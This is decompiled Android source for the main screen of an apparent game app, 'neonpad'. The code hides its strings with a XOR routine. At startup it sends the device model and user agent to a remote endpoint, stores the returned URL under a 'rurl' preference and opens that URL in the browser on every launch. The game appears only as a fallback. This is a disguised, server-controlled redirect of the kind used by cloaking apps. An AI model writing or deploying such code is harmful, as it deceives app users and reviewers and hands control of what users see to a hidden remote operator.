package com.fortuneink.neonpad;

import K.C0;
import K.E0;
import T.v;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import com.fortuneink.neonpad.databinding.ActivityMainBinding;
import e1.l;
import g.AbstractActivityC0158k;
import i1.o;
import i1.t;
import i1.u;
import i1.w;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import m1.j;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0158k {
    private final N0.b binding$delegate;
    private final N0.b prefs$delegate;
    private String redirectUrl;
    private final String _pName = d(new byte[]{21, 30, -79});
    private final String _pKey = d(new byte[]{4, 13, -92, -75});
    private final N0.b _httpClient$delegate = new N0.d(new h());

    /* JADX WARN: Failed to restore enum class, 'enum' modifier and super class removed */
    /* JADX WARN: Unknown enum class pattern. Please report as an issue! */
    public static final class RunState {
        private static final /* synthetic */ Q0.a $ENTRIES;
        private static final /* synthetic */ RunState[] $VALUES;
        public static final RunState COLD = new RunState("COLD", 0);
        public static final RunState WARM = new RunState("WARM", 1);
        public static final RunState HOT = new RunState("HOT", 2);

        private static final /* synthetic */ RunState[] $values() {
            return new RunState[]{COLD, WARM, HOT};
        }

        static {
            RunState[] $values = $values();
            $VALUES = $values;
            X0.f.e($values, "entries");
            $ENTRIES = new Q0.b($values);
        }

        private RunState(String str, int i) {
        }

        public static Q0.a getEntries() {
            return $ENTRIES;
        }

        public static RunState valueOf(String str) {
            return (RunState) Enum.valueOf(RunState.class, str);
        }

        public static RunState[] values() {
            return (RunState[]) $VALUES.clone();
        }
    }

    public MainActivity() {
        final int i = 0;
        this.binding$delegate = new N0.d(new W0.a(this) { // from class: com.fortuneink.neonpad.g

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f1721b;

            {
                this.f1721b = this;
            }

            @Override // W0.a
            public final Object a() {
                ActivityMainBinding binding_delegate$lambda$0;
                SharedPreferences prefs_delegate$lambda$1;
                switch (i) {
                    case 0:
                        binding_delegate$lambda$0 = MainActivity.binding_delegate$lambda$0(this.f1721b);
                        return binding_delegate$lambda$0;
                    default:
                        prefs_delegate$lambda$1 = MainActivity.prefs_delegate$lambda$1(this.f1721b);
                        return prefs_delegate$lambda$1;
                }
            }
        });
        final int i2 = 1;
        this.prefs$delegate = new N0.d(new W0.a(this) { // from class: com.fortuneink.neonpad.g

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f1721b;

            {
                this.f1721b = this;
            }

            @Override // W0.a
            public final Object a() {
                ActivityMainBinding binding_delegate$lambda$0;
                SharedPreferences prefs_delegate$lambda$1;
                switch (i2) {
                    case 0:
                        binding_delegate$lambda$0 = MainActivity.binding_delegate$lambda$0(this.f1721b);
                        return binding_delegate$lambda$0;
                    default:
                        prefs_delegate$lambda$1 = MainActivity.prefs_delegate$lambda$1(this.f1721b);
                        return prefs_delegate$lambda$1;
                }
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final u _httpClient_delegate$lambda$2() {
        return new u(new t());
    }

    public static final /* synthetic */ void access$loadFallbackGame(MainActivity mainActivity) {
        mainActivity.loadFallbackGame();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final ActivityMainBinding binding_delegate$lambda$0(MainActivity mainActivity) {
        return ActivityMainBinding.inflate(mainActivity.getLayoutInflater());
    }

    private final w buildRequest(String str) {
        v vVar = new v(4);
        X0.f.e(str, "url");
        if (l.z0(str, "ws:", true)) {
            String substring = str.substring(3);
            X0.f.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.z0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            X0.f.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        X0.f.e(str, "<this>");
        o oVar = new o();
        oVar.c(null, str);
        vVar.f823a = oVar.a();
        String d2 = d(new byte[]{46, 85, -110, -68, 0, 17, -75, -68, 91, 53, -71, -67, 19, 20});
        String str2 = Build.MODEL;
        X0.f.d(str2, "MODEL");
        vVar.p(d2, str2);
        vVar.p(d(new byte[]{55, 27, -75, -68, 6, 12, -5, -107, 23, 22, -79, -84, 23, 31, -77}), d(new byte[]{19, 22, -5, -116, 37, 84, -77, -73, 77, 9, -21, -23, 88, 65}));
        String d3 = d(new byte[]{35, 11, -77, -85, 91, 57, -79, -68, 24, 12});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        X0.f.d(defaultUserAgent, "getDefaultUserAgent(...)");
        vVar.p(d3, defaultUserAgent);
        return vVar.f();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final String d(byte[] bArr) {
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        while (i < length) {
            int i3 = i2 + 1;
            int i4 = i2 % 4;
            arrayList.add(Byte.valueOf((byte) ((i4 != 0 ? i4 != 1 ? i4 != 2 ? 217 : 214 : 120 : 118) ^ (bArr[i] & 255))));
            i++;
            i2 = i3;
        }
        return new String(O0.h.g0(arrayList), e1.a.f2371a);
    }

    /* JADX WARN: Multi-variable type inference failed */
    private final void enableFullscreen() {
        C0 c02;
        WindowInsetsController insetsController;
        q1.l.n0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            E0 e02 = new E0(insetsController, dVar);
            e02.h = window;
            c02 = e02;
        } else {
            c02 = new C0(window, dVar);
        }
        c02.J();
        c02.q0();
    }

    private final void fetchAndLoad() {
        m1.g gVar;
        String packageName = getPackageName();
        String d2 = d(new byte[]{4, 13, -92, -75});
        String d3 = d(new byte[]{73, 25, -90, -87, 75});
        String packageName2 = getPackageName();
        X0.f.d(packageName2, "getPackageName(...)");
        w buildRequest = buildRequest(new RequestHelper(packageName2, this).buildTarget() + d3 + packageName);
        u uVar = get_httpClient();
        uVar.getClass();
        X0.f.e(buildRequest, "request");
        j jVar = new j(uVar, buildRequest);
        MainActivity$fetchAndLoad$1 mainActivity$fetchAndLoad$1 = new MainActivity$fetchAndLoad$1(this, d2);
        if (!jVar.f3573e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3960a;
        jVar.f3574f = n.f3960a.g();
        v vVar = uVar.f2746a;
        m1.g gVar2 = new m1.g(jVar, mainActivity$fetchAndLoad$1);
        vVar.getClass();
        synchronized (vVar) {
            ((ArrayDeque) vVar.f824b).add(gVar2);
            String str = buildRequest.f2776a.f2715d;
            Iterator it = ((ArrayDeque) vVar.f825c).iterator();
            while (true) {
                if (!it.hasNext()) {
                    Iterator it2 = ((ArrayDeque) vVar.f824b).iterator();
                    while (true) {
                        if (!it2.hasNext()) {
                            gVar = null;
                            break;
                        } else {
                            gVar = (m1.g) it2.next();
                            if (X0.f.a(gVar.f3566c.f3570b.f2776a.f2715d, str)) {
                                break;
                            }
                        }
                    }
                } else {
                    gVar = (m1.g) it.next();
                    if (X0.f.a(gVar.f3566c.f3570b.f2776a.f2715d, str)) {
                        break;
                    }
                }
            }
            if (gVar != null) {
                gVar2.f3565b = gVar.f3565b;
            }
        }
        vVar.t();
    }

    private final ActivityMainBinding getBinding() {
        return (ActivityMainBinding) ((N0.d) this.binding$delegate).a();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final SharedPreferences getPrefs() {
        return (SharedPreferences) ((N0.d) this.prefs$delegate).a();
    }

    private final u get_httpClient() {
        return (u) ((N0.d) this._httpClient$delegate).a();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final void loadFallbackGame() {
        startActivity(new Intent(this, (Class<?>) MainActivity2.class));
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final void openExternal(String str) {
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            loadFallbackGame();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final SharedPreferences prefs_delegate$lambda$1(MainActivity mainActivity) {
        return mainActivity.getSharedPreferences(mainActivity._pName, 0);
    }

    @Override // androidx.fragment.app.AbstractActivityC0064v, a.p, z.j, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        enableFullscreen();
        if (RunState.COLD != null) {
            setContentView(getBinding().getRoot());
        }
        String string = getPrefs().getString(this._pKey, null);
        if (string == null || e1.d.H0(string)) {
            fetchAndLoad();
        } else {
            this.redirectUrl = string;
            openExternal(string);
        }
    }

    @Override // androidx.fragment.app.AbstractActivityC0064v, android.app.Activity
    public void onResume() {
        super.onResume();
        String str = this.redirectUrl;
        if (str != null) {
            openExternal(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            enableFullscreen();
        }
    }
}
